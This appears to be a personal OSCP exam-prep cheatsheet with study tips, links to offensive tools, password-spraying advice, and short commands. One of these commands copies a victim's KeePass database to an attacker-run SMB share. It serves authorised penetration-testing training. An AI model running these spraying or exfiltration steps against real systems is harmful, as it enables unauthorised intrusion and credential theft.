v.0.1

First rule is: No cheatsheet is a great as the one you forge with your own hands. Rewrite the pdf with your own words!

**This is the key to success.**

And to make as many labs as you can.

Having conquered the OSCP with a flawless victory (maxed out score), I've honed a razor-sharp methodology that cuts through the noise. This is not your run-of-the-mill cheatsheet bloated with trivialities. It's a lean, lethal collection of the absolute essentials — the pure bone meat of the craft.

Let's kick this off by saying the current version of the course (2023) is rock solid. With the labs, it'll gear you up good for the exam. I'm pumped to hit the next learning trail.
## Core Tenets:
- **Precision Over Complexity**: 
  - The core of success lies in a solid methodology.
  - However, remember to keep it straightforward—this is a basic exam, after all.
- **Don't Panic**: Stay cool under fire. Panic clouds judgement and leads to errors. Embrace the grind and remember, you've trained for this! 
- **Scheduled Breaks**: Adhere to pre-planned breaks to rest your mind and body. It's a marathon, not a sprint. 
- **Recharge**: Step outside, take a walk with your dog ; A short nap can reboot your mind, enhancing your problem-solving abilities upon return. 
- **Report:** Be ready to write it, simplify the method to the max, that's all. It can be word, but not from offsec, they have fucked up formatting.

## Initial Foothold: Where to Begin

- Acquired the target's hostname? Enlist it in `/etc/hosts`. Still in the dark? Engage in rigorous enumeration!
- Feel something is missing? Use different tool/flag or... revert!
- Don’t jump, check every corner like a pro.
- If you don't have fully functional shell, try to make one, some exploits depends on this.


## Digital Armory: Websites at Your Fingertips

Now, I'll provide you with a list of web resources you should have at your fingertips, along with insights on how to utilize them proficiently.

You know what is the best way to check if you see something unusual?
HIT UP GOOGLE AND HACKTRICKS! 

**google:** bla bla hacktricks

**google:** bla bla vulnerability

No nonsense here. I’ve listed only the rare and not-so-obvious commands. In the exam or on the field, you’ll encounter the unknown. No need to cram the whole web onto this cheatsheet.

https://www.revshells.com/

https://wadcoms.github.io/

https://lolbas-project.github.io/#

https://gtfobins.github.io/

https://gchq.github.io/CyberChef/

https://hashcat.net/wiki/doku.php?id=example_hashes

https://github.com/swisskyrepo/PayloadsAllTheThings

https://crackstation.net/

https://gchq.github.io/CyberChef/

The sequence doesn’t matter; master them. For me, this was my toolkit.

## Cyber Arsenal: Tools of The Trade

I ain’t spoon-feeding you descriptions, work these tools out yourself. Most ain’t in the course, but they’re gold. If they show up in the course, you better damn well sit up. These are the kinds of tools I’d have killed to know from the get-go.

##### AutoRecon
https://github.com/Tib3rius/AutoRecon
##### FeroxBuster
https://github.com/epi052/feroxbuster
##### enum4linux-ng
https://github.com/cddmp/enum4linux-ng
But remember, young Padawan, different version on Kali there is, yields different results it does. Equally intriguing both may be, worth checking with both, it is!
##### CrackMapExec 
https://github.com/mpgn/CrackMapExec
And awesome cheatsheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
##### PrivescCheck
https://github.com/itm4n/PrivescCheck/tree/master
##### SweetPotato
https://github.com/CCob/SweetPotato
##### JuicyPotatoNG
https://github.com/antonioCoco/JuicyPotatoNG
##### GodPotato
https://github.com/BeichenDream/GodPotato
##### pspy
https://github.com/DominicBreuker/pspy
##### A single click single file web server for Windows
https://github.com/faustinoaq/sswws

And now, trumpets blaring, the essentials you need to grasp to catapult your cyber existence to a realm of ease:
##### ligolo-ng
https://github.com/Nicocha30/ligolo-ng


## SPRAY 'EM ALL: The "I'm stuck" Crusade

Stumbled upon a new user? **Throw it into `USERS.TXT`.**  

Caught wind of a new password? Or something that smells like one? **Toss it into `PASSWORDS.TXT`.**  

Now, unleash the spray! **SPRAY! SPRAY! SPRAY!**

Whether it’s FTP, SSH, CME, SMB, Kerberos, admin consoles, or any credential-hungry beast, **feed 'em all.**  
Default creds? Dumb creds? **Throw 'em into the fray.**  
Encountered an alien software? Or a familiar one? **Hunt down those default credentials.**

New user on the block? Try the ol’ **username:password** trick. `user:user`, `admin:admin`, you know the drill.  
Password cracking playing hard to get? **Spin the username as the password.**  
Hashcat playing coy? Tried the rules? Now serenade it with **John**, or take **Crackstation** out for a spin.  
John acting pricey? **Invite Hashcat and Crackstation to the dance.**  
Crackstation not cutting it? **Hashcat and John might just do the tango.**

With the clock ticking away, I hammered down the final privilege escalation just an hour before the curtain call. And you know what? It's all thanks to keeping a cool head. Being damn calm in the chaos is not just good—it's golden!
## Weak Spots and hints: 

Now I'll unveil some tactical strikes against the soft points of various things.

```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/
usr/share/windows-resources,share
```

Do you know that you do can do sth like this?

Do you want to compile files correctly?

Use this: https://github.com/X0RW3LL/XenSpawn

Do you know how to transfer files like with **SMB?** 

Attacker:
```bash
sudo impacket-smbserver -smb2support sharename /tmp
```

Victim:
```shell
net use \\192.168.00.000\sharename
```

```bash
copy .\Database.kdbx \\192.168.00.000\sharename
```


-----

-  I'll keep this updated.
- I hammered out this "cheatsheet" reflecting on what I would have wanted by my side as I kicked off my OSCP adventure.
- Got suggestions? Hit me up at [raphostrovsky@pm.me](mailto:raphostrovsky@pm.me).
